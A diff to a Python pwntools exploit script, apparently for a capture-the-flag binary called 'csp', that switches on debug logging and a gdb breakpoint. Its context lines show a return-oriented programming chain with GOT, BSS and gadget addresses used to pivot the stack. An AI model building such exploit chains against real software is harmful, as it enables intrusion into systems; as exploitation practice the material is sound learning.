@@ -1,6 +1,6 @@
 #!/usr/bin/python 
 from pwn import *
-# context.log_level = 'debug'
+context.log_level = 'debug'
 p = process('csp')
 libc = ELF('libc.so.6')
 
@@ -9,8 +9,8 @@ read_got    = 0x0601020
 read_ret    = 0x040059E  # lea  rax, [rbp-20h]
 bss_start   = 0x0601048
 stack_base  = bss_start + 0x20
-p6r_gg 		= 0x040061A
-m3c_gg 		= 0x0400600
+p6r_gg 	    = 0x040061A
+m3c_gg 	    = 0x0400600
 
 def rop(func, arg1=0, arg2=0, arg3=0, ret=0xdeadbeef):
     tmp = (
@@ -38,7 +38,7 @@ payload1 = (
         )
 payload1 = ''.join(payload1)
 p.recvuntil('me\n')
-# gdb.attach(p, "b *0x04005af")
+gdb.attach(p, "b *0x04005af")
 p.sendline(payload1)
 log.success("stack controlled to bss.")
 log.success("rsp = " + hex(bss_start))
